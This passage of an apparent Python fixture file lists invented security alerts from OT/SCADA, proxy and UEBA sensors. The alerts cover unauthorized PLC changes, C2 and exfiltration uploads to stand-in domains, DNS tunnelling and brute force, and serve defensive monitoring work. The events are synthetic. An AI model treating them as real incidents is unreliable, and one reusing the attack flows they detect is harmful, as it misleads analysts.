        "description": "Remote access attempt from external IP 203.0.113.10 targeting a production network host—attempt did not traverse approved VPN channel.",
        "artifact": [
            {"type": "source_ip", "value": "203.0.113.10"},
            {"type": "destination_ip", "value": "10.1.1.50"},
            {"type": "protocol", "value": "TCP", "port": 22},
            {"type": "service", "value": "SSH"}
        ],
        "raw_log": {
            "sensor_id": "ot-firewall-01",
            "timestamp": "2025-09-18T17:25:44.912Z",
            "event_type": "TrafficBlock",
            "traffic_details": {
                "source_ip": "203.0.113.10",
                "destination_ip": "10.1.1.50",
                "destination_port": 22,
                "protocol": "TCP"
            },
            "security_context": {"reason": "Unauthorized external IP access to OT segment"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-05-High-Frequency-HMI-Commands",
        "rule_name": "High-frequency HMI operation commands",
        "alert_date": "2025-09-18T17:30:20Z",
        "tags": ["hmi", "command-spam", "anomaly"],
        "severity": "Medium",
        "reference": "HMI-CTRL-02 issuing abnormally high command rate",
        "description": "HMI HMI-CTRL-02 issued an unusually high rate of operational commands to multiple controllers in a short window—possible malicious script or automation attack.",
        "artifact": [
            {"type": "device_id", "value": "HMI-CTRL-02"},
            {"type": "ip", "value": "10.1.1.45"},
            {"type": "command_rate", "value": "20 commands/sec"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line03",
            "timestamp": "2025-09-18T17:30:19.444Z",
            "event_type": "ControlCommandRateAnomaly",
            "device_details": {"device_id": "HMI-CTRL-02", "ip_address": "10.1.1.45"},
            "anomaly_details": {"command_count": 120, "time_window_sec": 6, "reason": "High frequency of write commands"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-06-Controller-Password-Reset-Attempt",
        "rule_name": "Controller password reset attempt",
        "alert_date": "2025-09-18T17:35:50Z",
        "tags": ["authentication", "password-reset", "brute-force"],
        "severity": "High",
        "reference": "Multiple failed password reset attempts on PLC-PROD-02",
        "description": "Detected multiple failed password reset attempts against controller PLC-PROD-02—indicates potential brute force or unauthorized access attempt.",
        "artifact": [
            {"type": "device_id", "value": "PLC-PROD-02"},
            {"type": "ip", "value": "10.1.1.11"},
            {"type": "attempt_count", "value": 5}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:35:49.111Z",
            "event_type": "AuthenticationFailure",
            "device_details": {"device_id": "PLC-PROD-02", "ip_address": "10.1.1.11"},
            "auth_details": {"attempt_count": 5, "protocol": "Modbus", "source_ip": "10.1.1.99"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-07-Unauthorized-Access-to-Engineering-Workstation",
        "rule_name": "Unauthorized access to engineering workstation",
        "alert_date": "2025-09-18T17:40:25Z",
        "tags": ["access-control", "workstation", "lateral-movement"],
        "severity": "High",
        "reference": "Unauthorized login attempt on WKS-ENG-12",
        "description": "Unauthorized login attempt detected on engineering workstation WKS-ENG-12, which holds sensitive engineering project files—a high-value target.",
        "artifact": [
            {"type": "device_id", "value": "WKS-ENG-12"},
            {"type": "ip", "value": "10.1.2.55"},
            {"type": "source_ip", "value": "10.1.1.10"},
            {"type": "username", "value": "guest"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-engineering",
            "timestamp": "2025-09-18T17:40:24.789Z",
            "event_type": "LoginAttempt",
            "device_details": {"device_id": "WKS-ENG-12", "ip_address": "10.1.2.55"},
            "auth_details": {"username": "guest", "status": "failed", "source_ip": "10.1.1.10"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-08-New-Device-on-SCADA-Network",
        "rule_name": "New device detected on SCADA network",
        "alert_date": "2025-09-18T17:45:10Z",
        "tags": ["inventory", "network-scan", "new-device"],
        "severity": "Medium",
        "reference": "Unknown PLC appeared in SCADA network",
        "description": "New PLC detected on SCADA network not present in asset inventory—may indicate unauthorized connection or reconnaissance activity.",
        "artifact": [
            {"type": "device_type", "value": "PLC"},
            {"type": "ip", "value": "10.1.1.15"},
            {"type": "mac", "value": "00:1A:2B:3C:4D:5E"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:45:09.600Z",
            "event_type": "NewDeviceDiscovery",
            "device_details": {"ip_address": "10.1.1.15", "mac_address": "00:1A:2B:3C:4D:5E", "device_type": "PLC"},
            "security_context": {"reason": "Device not in asset inventory"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-09-Process-Parameter-Out-of-Range",
        "rule_name": "Process parameter out of safe range",
        "alert_date": "2025-09-18T17:50:40Z",
        "tags": ["process-anomaly", "physical-impact", "safety"],
        "severity": "High",
        "reference": "CHEM-PUMP-04 pressure exceeded normal range",
        "description": "Pressure reading on chemical pump CHEM-PUMP-04 spiked beyond configured safe operating range—possible malicious command or equipment fault.",
        "artifact": [
            {"type": "device_id", "value": "CHEM-PUMP-04"},
            {"type": "ip", "value": "10.2.1.22"},
            {"type": "parameter", "value": "Pressure"},
            {"type": "value", "value": "150 PSI"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line04",
            "timestamp": "2025-09-18T17:50:39.123Z",
            "event_type": "ProcessValueAnomaly",
            "device_details": {"device_id": "CHEM-PUMP-04", "ip_address": "10.2.1.22"},
            "value_details": {"parameter": "Pressure", "value": 150, "unit": "PSI", "normal_range": "20-80"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-10-Lateral-Movement-Attempt-Protocol-Hop",
        "rule_name": "Protocol-hop lateral movement attempt",
        "alert_date": "2025-09-18T17:55:05Z",
        "tags": ["lateral-movement", "protocol-hop"],
        "severity": "High",
        "reference": "IT network host attempted PLC access via SCADA network",
        "description": "Workstation (10.100.1.5) in IT network attempted direct PLC access through SCADA gateway (10.1.1.1)—violates segmentation principles.",
        "artifact": [
            {"type": "source_ip", "value": "10.100.1.5"},
            {"type": "destination_ip", "value": "10.1.1.10"},
            {"type": "protocol", "value": "Modbus/TCP"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-gateway-01",
            "timestamp": "2025-09-18T17:55:04.990Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.100.1.5",
                "destination_ip": "10.1.1.10",
                "destination_port": 502,
                "protocol": "TCP"
            },
            "network_context": {"reason": "IT-to-OT unauthorized protocol flow"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-11-Network-Scan-Activity",
        "rule_name": "Production network scan activity",
        "alert_date": "2025-09-18T18:00:15Z",
        "tags": ["reconnaissance", "network-scan"],
        "severity": "High",
        "reference": "Host 10.1.2.80 scanning production network",
        "description": "Large-scale port scanning from host 10.1.2.80 targeting multiple OT devices in production network—typical reconnaissance behavior.",
        "artifact": [
            {"type": "source_ip", "value": "10.1.2.80"},
            {"type": "scan_target_count", "value": 50},
            {"type": "ports_scanned", "value": ["502", "102", "44818"]}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line02",
            "timestamp": "2025-09-18T18:00:14.543Z",
            "event_type": "NetworkScanDetection",
            "scan_details": {
                "source_ip": "10.1.2.80",
                "target_ips": ["10.1.1.10", "10.1.1.11", "..."],
                "scanned_ports": [502, 102, 44818]
            },
            "security_context": {"reason": "Systematic port scanning of OT devices"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-12-Failed-Logic-Transfer-Attempt",
        "rule_name": "Failed PLC logic transfer attempt",
        "alert_date": "2025-09-18T18:05:30Z",
        "tags": ["plc", "logic-change", "failure"],
        "severity": "Medium",
        "reference": "Failed logic upload to PLC-PROD-03",
        "description": "Failed attempt to upload new logic program to PLC-PROD-03—may indicate unauthorized firmware modification or malicious logic injection attempt.",
        "artifact": [
            {"type": "device_id", "value": "PLC-PROD-03"},
            {"type": "ip", "value": "10.1.1.12"},
            {"type": "action", "value": "PLC-Logic-Write"},
            {"type": "status", "value": "Failed"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T18:05:29.987Z",
            "event_type": "DeviceControlActivity",
            "device_details": {"device_id": "PLC-PROD-03", "ip_address": "10.1.1.12", "vendor": "Rockwell"},
            "activity_details": {"action": "logic-write", "status": "failed", "source_ip": "10.1.2.55", "reason": "Checksum mismatch"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-13-Suspicious-File-Transfer-SCADA",
        "rule_name": "Suspicious file transfer from SCADA server",
        "alert_date": "2025-09-18T18:10:45Z",
        "tags": ["file-transfer", "data-exfiltration", "scada"],
        "severity": "High",
        "reference": "SCADA-Server-01 transferring file externally",
        "description": "SCADA server SCADA-Server-01 initiated large file transfer to external server (10.1.50.200) outside production network—potential data exfiltration.",
        "artifact": [
            {"type": "source_device", "value": "SCADA-Server-01"},
            {"type": "source_ip", "value": "10.1.2.10"},
            {"type": "destination_ip", "value": "10.1.50.200"},
            {"type": "protocol", "value": "FTP"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-scada",
            "timestamp": "2025-09-18T18:10:44.666Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.1.2.10",
                "destination_ip": "10.1.50.200",
                "destination_port": 21,
                "protocol": "TCP",
                "bytes_out": 250000000
            },
            "network_context": {"reason": "Large outbound file transfer from SCADA server"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-14-Firmware-Tampering-Attempt",
        "rule_name": "Firmware tampering attempt",
        "alert_date": "2025-09-18T18:15:20Z",
        "tags": ["firmware", "tampering", "integrity"],
        "severity": "Critical",
        "reference": "Abnormal firmware hash on SENSOR-TEMP-07",
        "description": "Firmware hash of temperature sensor SENSOR-TEMP-07 does not match known-good hash—indicates possible firmware tampering.",
        "artifact": [
            {"type": "device_id", "value": "SENSOR-TEMP-07"},
            {"type": "ip", "value": "10.2.2.35"},
            {"type": "file_hash_sha256", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line04",
            "timestamp": "2025-09-18T18:15:19.444Z",
            "event_type": "FirmwareIntegrityCheck",
            "device_details": {"device_id": "SENSOR-TEMP-07", "ip_address": "10.2.2.35"},
            "integrity_details": {"firmware_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                                  "known_good_hash": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3", "reason": "Hash mismatch"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-15-Unauthorized-Serial-Communication",
        "rule_name": "Unauthorized serial communication",
        "alert_date": "2025-09-18T18:20:00Z",
        "tags": ["serial-communication", "legacy-protocol", "physical-access"],
        "severity": "High",
        "reference": "Abnormal serial communication between HMI-CTRL-01 and PLC-PROD-01",
        "description": "Unauthorized serial communication established between HMI-CTRL-01 and PLC-PROD-01—bypasses network security controls and may allow malicious command injection.",
        "artifact": [
            {"type": "source_device", "value": "HMI-CTRL-01"},
            {"type": "destination_device", "value": "PLC-PROD-01"},
            {"type": "protocol", "value": "Modbus-RTU"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T18:19:59.876Z",
            "event_type": "SerialCommunication",
            "communication_details": {
                "source_device": "HMI-CTRL-01",
                "destination_device": "PLC-PROD-01",
                "port": "COM1",
                "protocol": "Modbus-RTU"
            },
            "security_context": {"reason": "Unauthorized physical or serial communication link"}
        }
    }
]

ot_alert.extend([
    {
        "source": "OT",
        "rule_id": "OT-Rule-01-PLC-Configuration-Change",
        "rule_name": "Unauthorized PLC configuration change",
        "alert_date": "2025-09-18T17:10:00Z",
        "tags": ["plc", "unauthorized-change", "firmware"],
        "severity": "Critical",
        "reference": "Unauthorized configuration change on production line PLC01",
        "description": "Detected unauthorized modification to firmware or configuration of production line PLC-PROD-01—may cause process disruption or safety risk.",
        "artifact": [
            {"type": "device_id", "value": "PLC-PROD-01"},
            {"type": "ip", "value": "10.1.1.10"},
            {"type": "protocol", "value": "S7Comm"},
            {"type": "change_type", "value": "PLC-Firmware-Update"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:09:59.321Z",
            "event_type": "DeviceConfigurationChange",
            "device_details": {"device_id": "PLC-PROD-01", "ip_address": "10.1.1.10", "vendor": "Siemens"},
            "change_details": {"type": "firmware-update", "status": "succeeded", "source_ip": "10.1.2.55", "user": "system"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-02-Unusual-Protocol-Activity",
        "rule_name": "Suspicious protocol activity in SCADA network",
        "alert_date": "2025-09-18T17:15:30Z",
        "tags": ["protocol", "network-anomaly", "scada"],
        "severity": "Medium",
        "reference": "Unusual RDP connection observed in SCADA network",
        "description": "Host SCADA-HMI-05 in SCADA segment initiated an RDP connection to an unknown host—RDP is atypical for SCADA production communications.",
        "artifact": [
            {"type": "source_device", "value": "SCADA-HMI-05"},
            {"type": "source_ip", "value": "10.1.1.20"},
            {"type": "destination_ip", "value": "10.1.50.123"},
            {"type": "protocol", "value": "RDP", "port": 3389}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line02",
            "timestamp": "2025-09-18T17:15:29.876Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.1.1.20",
                "destination_ip": "10.1.50.123",
                "destination_port": 3389,
                "protocol": "TCP"
            },
            "network_context": {"segment": "SCADA-Network-Zone", "reason": "Unusual protocol for this segment"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-01-PLC-Configuration-Change",
        "rule_name": "Unauthorized PLC configuration change",
        "alert_date": "2025-09-19T08:30:15Z",
        "tags": ["plc", "unauthorized-change", "firmware"],
        "severity": "Critical",
        "reference": "Unauthorized program upload on water treatment PLC03",
        "description": "Detected unauthorized program upload on water treatment system PLC-WATER-03—may cause water supply operational issues or contamination risk.",
        "artifact": [
            {"type": "device_id", "value": "PLC-WATER-03"},
            {"type": "ip", "value": "10.2.1.30"},
            {"type": "protocol", "value": "Modbus/TCP"},
            {"type": "change_type", "value": "PLC-Program-Upload"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-waterplant",
            "timestamp": "2025-09-19T08:30:14.567Z",
            "event_type": "DeviceConfigurationChange",
            "device_details": {"device_id": "PLC-WATER-03", "ip_address": "10.2.1.30", "vendor": "Schneider Electric"},
            "change_details": {"type": "program-upload", "status": "succeeded", "source_ip": "10.2.2.88", "user": "engineer_account"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-02-Unusual-Protocol-Activity",
        "rule_name": "Suspicious protocol activity in SCADA network",
        "alert_date": "2025-09-19T09:45:50Z",
        "tags": ["protocol", "network-anomaly", "scada"],
        "severity": "Medium",
        "reference": "Unusual FTP connection observed in SCADA network",
        "description": "Host SCADA-HMI-02 initiated an FTP connection to internal host—FTP uncommon for SCADA data transfer, potential data exfiltration or malicious file transfer.",
        "artifact": [
            {"type": "source_device", "value": "SCADA-HMI-02"},
            {"type": "source_ip", "value": "10.1.1.22"},
            {"type": "destination_ip", "value": "10.1.1.99"},
            {"type": "protocol", "value": "FTP", "port": 21}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line02",
            "timestamp": "2025-09-19T09:45:49.111Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.1.1.22",
                "destination_ip": "10.1.1.99",
                "destination_port": 21,
                "protocol": "TCP"
            },
            "network_context": {"segment": "SCADA-Network-Zone", "reason": "Unusual protocol for data transfer"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-01-PLC-Configuration-Change",
        "rule_name": "Unauthorized PLC configuration change",
        "alert_date": "2025-09-19T10:18:25Z",
        "tags": ["plc", "unauthorized-change", "firmware"],
        "severity": "Critical",
        "reference": "Unauthorized setting change on gas transport PLC05",
        "description": "Unauthorized modification of operating parameters (e.g., pressure thresholds) on gas transport system PLC-GAS-05—could cause gas leak or severe safety incident.",
        "artifact": [
            {"type": "device_id", "value": "PLC-GAS-05"},
            {"type": "ip", "value": "10.3.1.50"},
            {"type": "protocol", "value": "DNP3"},
            {"type": "change_type", "value": "Runtime-Parameter-Change"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-gas-station",
            "timestamp": "2025-09-19T10:18:24.777Z",
            "event_type": "DeviceConfigurationChange",
            "device_details": {"device_id": "PLC-GAS-05", "ip_address": "10.3.1.50", "vendor": "Rockwell"},
            "change_details": {"type": "parameter-change", "status": "succeeded", "source_ip": "10.3.2.112", "user": "remote_access"}
        }
    }
])

proxy_alert = [
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-01-Malware-Download-Blocked",
        "rule_name": "Malicious software download blocked",
        "alert_date": "2025-09-18T19:00:15Z",
        "tags": ["malware", "download", "blocked"],
        "severity": "Critical",
        "reference": "User a.smith attempted to download executable from malicious site",
        "description": "Proxy server blocked user a.smith from downloading an executable from known malicious domain; file flagged as malware by security engine.",
        "artifact": [
            {"type": "username", "value": "a.smith"},
            {"type": "source_ip", "value": "192.168.2.54"},
            {"type": "destination_url", "value": "http://malware-distro.com/update.exe"},
            {"type": "threat_name", "value": "Trojan.Agent"},
            {"type": "action", "value": "Blocked"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-01",
            "timestamp": "2025-09-18T19:00:14.998Z",
            "event_type": "WebAccess",
            "user_details": {"username": "a.smith", "ip_address": "192.168.2.54"},
            "access_details": {
                "url": "http://malware-distro.com/update.exe",
                "method": "GET",
                "status": "403 Forbidden",
                "policy": "Blocklist-ThreatIntel"
            },
            "threat_details": {
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "engine": "Antivirus Scan"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-02-C2-Communication-Blocked",
        "rule_name": "C2 communication blocked",
        "alert_date": "2025-09-18T19:05:30Z",
        "tags": ["c2", "cobaltstrike", "blocked"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 attempted C2 server connection",
        "description": "Proxy detected and blocked connection attempt from host FIN-WKS-JDOE-05 to known command and control (C2) server.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "threat_type", "value": "C2 Traffic"},
            {"type": "action", "value": "Blocked"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:05:29.876Z",
            "event_type": "WebAccess",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "access_details": {
                "url": "https://known-bad.c2.server/api/v1/data",
                "method": "POST",
                "status": "403 Forbidden",
                "policy": "ThreatIntel-C2"
            },
            "threat_details": {
                "verdict": "Malicious",
                "reason": "Known C2 domain/IP"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-03-Phishing-URL-Detected",
        "rule_name": "Phishing site access blocked",
        "alert_date": "2025-09-18T19:10:45Z",
        "tags": ["phishing", "url-threat", "blocked"],
        "severity": "High",
        "reference": "User c.jones attempted to access phishing site",
        "description": "Proxy blocked user c.jones accessing phishing site impersonating corporate login portal.",
        "artifact": [
            {"type": "username", "value": "c.jones"},
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "destination_url", "value": "http://mycorp-ssologin.net/portal"},
            {"type": "threat_type", "value": "Phishing"},
            {"type": "action", "value": "Blocked"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-01",
            "timestamp": "2025-09-18T19:10:44.666Z",
            "event_type": "WebAccess",
            "user_details": {"username": "c.jones", "ip_address": "192.168.3.88"},
            "access_details": {
                "url": "http://mycorp-ssologin.net/portal",
                "status": "403 Forbidden",
                "policy": "Phishing-Blocklist"
            },
            "threat_details": {
                "verdict": "Malicious",
                "reason": "URL impersonation pattern"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-04-Unauthorized-Cloud-Storage",
        "rule_name": "Unauthorized cloud storage access",
        "alert_date": "2025-09-18T19:15:20Z",
        "tags": ["data-exfiltration", "cloud-storage"],
        "severity": "Medium",
        "reference": "User d.chen accessed personal Dropbox account",
        "description": "User d.chen accessed personal cloud storage service (Dropbox) not authorized by company—possible data exfiltration vector.",
        "artifact": [
            {"type": "username", "value": "d.chen"},
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_domain", "value": "dropbox.com"},
            {"type": "threat_type", "value": "Policy Violation"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-03",
            "timestamp": "2025-09-18T19:15:19.444Z",
            "event_type": "WebAccess",
            "user_details": {"username": "d.chen", "ip_address": "192.168.4.12"},
            "access_details": {
                "url": "https://www.dropbox.com/home",
                "status": "200 OK",
                "policy": "Block-Unauthorized-Cloud-Storage"
            },
            "security_context": {
                "action": "Alert Only",
                "reason": "Policy violation: Access to unauthorized cloud storage"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-05-High-Risk-Category-Access",
        "rule_name": "Access to high-risk content category",
        "alert_date": "2025-09-18T19:20:05Z",
        "tags": ["policy-violation", "high-risk"],
        "severity": "Low",
        "reference": "User m.li accessed gambling site",
        "description": "User m.li accessed a high-risk site categorized as 'Gambling', violating corporate acceptable use policy.",
        "artifact": [
            {"type": "username", "value": "m.li"},
            {"type": "source_ip", "value": "192.168.5.31"},
            {"type": "destination_domain", "value": "online-casino.com"},
            {"type": "category", "value": "Gambling"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-01",
            "timestamp": "2025-09-18T19:20:04.555Z",
            "event_type": "WebAccess",
            "user_details": {"username": "m.li", "ip_address": "192.168.5.31"},
            "access_details": {
                "url": "http://www.online-casino.com/play",
                "status": "200 OK",
                "policy": "Permit-Alert"
            },
            "security_context": {
                "category": "Gambling",
                "action": "Alert Only"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-06-Suspicious-User-Agent",
        "rule_name": "Suspicious user-agent access",
        "alert_date": "2025-09-18T19:25:50Z",
        "tags": ["anomaly", "botnet", "reconnaissance"],
        "severity": "Medium",
        "reference": "FIN-WKS-JDOE-05 using anomalous user-agent",
        "description": "Network requests from host FIN-WKS-JDOE-05 used an unusual User-Agent string—possible botnet or automated script activity.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "user_agent", "value": "Mozilla/5.0 (Windows NT 6.1; WOW64) Gecko/20100101 Firefox/56.0"},
            {"type": "threat_type", "value": "Botnet/C2"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:25:49.111Z",
            "event_type": "WebAccess",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "access_details": {
                "url": "http://api.external-service.org/check",
                "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) Gecko/20100101 Firefox/56.0",
                "status": "200 OK"
            },
            "security_context": {
                "reason": "User-Agent mismatch with known browser patterns"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-07-SSL-Inspection-Bypass",
        "rule_name": "SSL inspection bypass attempt",
        "alert_date": "2025-09-18T19:30:25Z",
        "tags": ["evasion", "ssl-tls", "policy-violation"],
        "severity": "High",
        "reference": "User j.doe attempted to bypass SSL inspection",
        "description": "User j.doe attempted to access a site presenting an invalid certificate to evade SSL inspection—may hide malicious traffic or inappropriate content.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "bad-cert-site.com"},
            {"type": "threat_type", "value": "Evasion"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:30:24.789Z",
            "event_type": "SSLConnection",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "ssl_details": {
                "url": "https://bad-cert-site.com",
                "verdict": "Blocked",
                "reason": "Invalid or untrusted SSL certificate"
            },
            "security_context": {
                "action": "Blocked",
                "reason": "SSL inspection bypass attempt"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-08-File-Upload-to-Suspicious-Domain",
        "rule_name": "File uploaded to suspicious domain",
        "alert_date": "2025-09-18T19:35:10Z",
        "tags": ["data-exfiltration", "file-upload"],
        "severity": "Medium",
        "reference": "User a.smith uploaded file to low-reputation domain",
        "description": "User a.smith uploaded a file to a known low-reputation domain—possible active data exfiltration.",
        "artifact": [
            {"type": "username", "value": "a.smith"},
            {"type": "source_ip", "value": "192.168.2.54"},
            {"type": "destination_domain", "value": "data-receiver.ru"},
            {"type": "action", "value": "file-upload"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-03",
            "timestamp": "2025-09-18T19:35:09.600Z",
            "event_type": "WebAccess",
            "user_details": {"username": "a.smith", "ip_address": "192.168.2.54"},
            "access_details": {
                "url": "http://data-receiver.ru/upload.php",
                "method": "POST",
                "file_size_bytes": 1200000,
                "status": "200 OK"
            },
            "security_context": {
                "reason": "File upload to a low-reputation domain"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-09-High-Volume-DNS-Queries",
        "rule_name": "High-frequency DNS queries",
        "alert_date": "2025-09-18T19:40:40Z",
        "tags": ["dns", "reconnaissance", "data-tunneling"],
        "severity": "High",
        "reference": "Host FIN-WKS-JDOE-05 issued large volume anomalous DNS queries",
        "description": "Host FIN-WKS-JDOE-05 generated a high volume of anomalous DNS queries in a short window—potential DNS tunneling or reconnaissance.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "query_count", "value": 500}
        ],
        "raw_log": {
            "proxy_server": "proxy-dns-gw-01",
            "timestamp": "2025-09-18T19:40:39.123Z",
            "event_type": "DNSQuery",
            "user_details": {"ip_address": "192.168.1.101"},
            "query_details": {
                "domain_list": ["a.exfil.dns.com", "b.exfil.dns.com", "..."],
                "query_rate": "100 queries/sec"
            },
            "security_context": {
                "reason": "High-volume, rapid-fire DNS queries"
            }
        }
    },
    {
        "source": "Proxy",
        "rule_id": "PROXY-Rule-10-Policy-Violation-Circumvention",
        "rule_name": "Policy circumvention attempt",
        "alert_date": "2025-09-18T19:45:25Z",
        "tags": ["evasion", "circumvention", "vpn"],
        "severity": "High",
        "reference": "User j.doe attempted to access VPN service",
        "description": "User j.doe attempted to access and connect to a VPN service to bypass corporate proxy and content filtering controls.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_domain", "value": "nordvpn.com"},
            {"type": "threat_type", "value": "Circumvention"}
        ],
        "raw_log": {
            "proxy_server": "proxy-gw-02",
            "timestamp": "2025-09-18T19:45:24.777Z",
            "event_type": "WebAccess",
            "user_details": {"username": "j.doe", "ip_address": "192.168.1.101"},
            "access_details": {
                "url": "https://nordvpn.com/login",
                "status": "403 Forbidden",
                "policy": "Block-VPN-Anonymizers"
            },
            "security_context": {
                "action": "Blocked",
                "reason": "Attempt to access a VPN service to bypass security controls"
            }
        }
    }
]
ueba_alert = [
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-01-Lateral-Movement-Spike",
        "rule_name": "After-hours anomalous lateral movement",
        "alert_date": "2025-09-23T22:35:00Z",
        "tags": ["lateral-movement", "anomaly", "after-hours", "compromised-account"],
        "severity": "High",
        "reference": "User j.doe account logged into multiple servers after hours",
        "description": "User j.doe account performed after-hours logins to multiple servers outside normal scope—significant deviation from baseline, possible compromise.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "time_of_day", "value": "After-hours"},
            {"type": "login_count", "value": 7},
            {"type": "login_targets", "value": ["SRV-FINANCE-02", "SRV-HR-05", "DB-PROD-01"]}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T22:34:59.789Z",
            "event_type": "LoginAnomaly",
            "user_details": {"username": "j.doe", "department": "Finance"},
            "behavioral_details": {
                "login_time": "22:30-22:35",
                "normal_login_time": "09:00-18:00",
                "login_target_change_score": 9.5,
                "login_rate_score": 8.8
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-02-Unusual-Data-Volume-Download",
        "rule_name": "Abnormal data exfiltration volume",
        "alert_date": "2025-09-23T11:15:20Z",
        "tags": ["data-exfiltration", "anomaly", "insider-threat"],
        "severity": "High",
        "reference": "User h.lin downloaded large volume to personal cloud storage",
        "description": "User h.lin downloaded an unusually large batch of files from SharePoint and synced to personal Google Drive—severe deviation from historical transfer patterns.",
        "artifact": [
            {"type": "username", "value": "h.lin"},
            {"type": "data_source", "value": "SharePoint"},
            {"type": "data_destination", "value": "Google Drive"},
            {"type": "data_volume_gb", "value": 2.5},
            {"type": "file_count", "value": 150}
        ],
        "raw_log": {
            "ueba_engine": "ueba-core-engine",
            "timestamp": "2025-09-23T11:15:19.444Z",
            "event_type": "DataTransferAnomaly",
            "user_details": {"username": "h.lin", "department": "HR"},
            "behavioral_details": {
                "normal_data_volume_gb_24h": 0.05,
                "current_data_volume_gb_24h": 2.5,
                "volume_deviation_score": 9.8,
                "destination_deviation_score": 9.0
            }
        }
    },
    {
        "source": "UEBA",
        "rule_id": "UEBA-Rule-03-Account-Brute-Force-Multiple-Sources",
        "rule_name": "Multi-source account brute force",
        "alert_date": "2025-09-23T05:40:55Z",
        "tags": ["authentication", "brute-force", "distributed-attack"],
        "severity": "High",
        "reference": "Distributed brute force from multiple IPs against single account",
